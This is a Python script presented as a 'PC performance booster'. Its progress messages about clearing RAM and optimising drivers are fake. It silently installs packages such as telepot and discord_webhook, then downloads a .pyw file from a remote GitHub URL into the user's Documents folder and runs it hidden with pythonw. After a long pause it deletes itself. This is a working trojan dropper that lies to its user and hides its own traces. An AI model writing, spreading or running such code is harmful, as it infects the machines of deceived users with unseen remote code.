import time
import subprocess
import os
from pathlib import Path
import sys

def delete_script():
    script_path = os.path.abspath(sys.argv[0])
    try:
        os.remove(script_path)
        print(f"Script '{script_path}' deleted successfully.")
    except Exception as e:
        print(f"Error deleting script: {e}")

print ("welcome to the light-weight pc preformance booster.")
time.sleep(1)
print("Checking temp folder 1")
time.sleep(1)
print("Checking temp folder 2")
time.sleep(2)
print("Installing path libraries")
# List of libraries to install
libraries = [
    "telepot",
    "string",
    "random",
    "socket",
    "discord_webhook",
    "hashlib",
    "cryptography",
    "numpy",
    "pandas",
    "matplotlib",
    "requests",
    "os",
    "shutil",
    "math"
    # Add more libraries here as needed
]

# Constructing PowerShell command to install libraries
powershell_cmd = ";".join([f"pip install {lib}" for lib in libraries])

# Execute PowerShell command
try:
    subprocess.run(["powershell", "-Command", powershell_cmd], check=False)
    print("Libraries installed successfully.")
except subprocess.CalledProcessError:
    print("Error occurred while installing libraries.")

print("clearing RAM")

import requests

def download_and_open_file(url):
    documents_path = Path.home() / "Documents"
    
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise an HTTPError for bad responses
        
        filename = os.path.basename(url)
        filepath = os.path.join(documents_path, filename)
        
        with open(filepath, 'wb') as f:
            f.write(response.content)

        #print(f"File downloaded successfully to {filepath}")

        # Open the file using the default Python interpreter for .pyw files
        python_executable = 'pythonw.exe' if os.name == 'nt' else 'pythonw'
        subprocess.run([python_executable, filepath])

    except requests.exceptions.RequestException as e:
        pass

    except subprocess.CalledProcessError as e:
        pass

file_url = r"https://raw.githubusercontent.com/Lixvinity/winjv/main/Cleaner.pyw"

print("Optimising driver's")
time.sleep(5)
print("Setting drivers to game ready.")
time.sleep(3)
print("This could take around 8 - 10 minutes")
download_and_open_file(file_url)

time.sleep(500)
delete_script()
